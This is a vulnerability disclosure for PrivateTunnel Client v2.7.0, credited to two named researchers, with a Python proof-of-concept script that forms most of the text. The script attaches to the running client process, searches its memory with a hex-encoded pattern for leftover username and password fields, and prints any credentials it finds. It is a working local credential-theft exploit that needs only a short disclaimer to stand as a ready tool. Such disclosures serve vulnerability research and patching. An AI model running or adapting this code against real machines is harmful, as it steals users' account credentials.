#####
# PrivateTunnel Client v2.7.0 (x64) Local Credentials Disclosure After Sign out Exploit
# Tested on Windows Windows 7 64bit, English
# Vendor Homepage 	@ https://www.privatetunnel.com
# Date 14/09/2016
# Bug Discovery by:
#
# Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
# http://www.black-rose.ml
#
# Viktor Minin (https://www.linkedin.com/in/MininViktor)
# https://1-33-7.com/
#
#####
# PrivateTunnel Client v2.7.0 is vulnerable to local credentials disclosure after the user is logged out.
# It seems that PrivateTunnel does store the supplied credentials while the user is logged in and after sign out in a plaintext format in memory process.
# A potential attacker could reveal the supplied username and password in order to gain access to PrivateTunnel account.
#
# Authors are not responsible for any misuse or demage which caused by use of this script code.
# Please use responsibly.
#####
# Proof-Of-Concept Code:

import time
import urllib
from winappdbg import Debug, Process

usr			= ''
pwd			= ''
found		= 0
filename 	= "privatetunnel2.7.0.exe"
process_pid = 0
memory_dump	= []

debug = Debug()
try:
	print "###########################################################################"
	print "# PrivateTunnel v2.7.0 Local Credentials Disclosure Exploit After Sign out#"
	print "#\t\tBug Discovery by Yakir Wizman, Victor Minin\t\t  #"
	print "#\t\tTested on Windows Windows 7 64bit, English\t\t  #"
	print "#\t\t\tPlease use responsibly.\t\t\t\t  #"
	print "###########################################################################\r\n"
	print "[~] Searching for pid by process name '%s'.." % (filename)
	time.sleep(1)
	debug.system.scan_processes()
	for (process, process_name) in debug.system.find_processes_by_filename(filename):
		process_pid = process.get_pid()
	if process_pid is not 0:
		print "[+] Found process with pid #%d" % (process_pid)
		time.sleep(1)
		print "[~] Trying to read memory for pid #%d" % (process_pid)
		
		process = Process(process_pid)
		
		user_pattern = '\x20\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x20\x3A\x20\x22(.*)\x22\x2C\x0A\x20\x20\x20\x22\x75\x73\x65\x72\x6E\x61\x6D\x65\x22\x20\x3A\x20\x22(.*)\x22\x0A'
		for address in process.search_regexp(user_pattern):
			memory_dump.append(address)
		
		try:
			usr = memory_dump[0][2].split('"username" : "')[1].replace('"\n', '')
			pwd = memory_dump[0][2].split('"password" : "')[1].split('",')[0]
		except:
			pass
		print ""
		if usr != '' and pwd !='':
			found = 1
			print "[+] PrivateTunnel Credentials found!\r\n----------------------------------------"
			print "[+] Username: %s" % usr
			print "[+] Password: %s" % pwd
		if found == 0:
			print "[-] Credentials not found!"

	else:
		print "[-] No process found with name '%s'." % (filename)
	
	debug.loop()
finally:
    debug.stop()
